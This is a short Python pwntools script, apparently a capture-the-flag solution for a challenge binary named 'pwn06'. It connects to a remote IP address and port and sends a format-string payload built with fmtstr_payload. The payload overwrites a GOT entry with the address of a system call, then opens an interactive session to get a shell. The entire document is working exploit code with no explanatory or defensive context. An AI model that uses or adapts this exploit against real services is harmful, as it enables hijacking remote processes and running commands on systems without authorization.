from pwn import *
#p=process('./pwn06')
p=remote('103.229.41.18',8083)
#raw_input("DEBUG")
context.clear(arch = 'amd64')
#10
system = 0x0000000000400975
got = 0x601018
#payload = "a"*8+"%10$p"
payload = fmtstr_payload(10, {got: system})
p.sendline(payload)
p.interactive()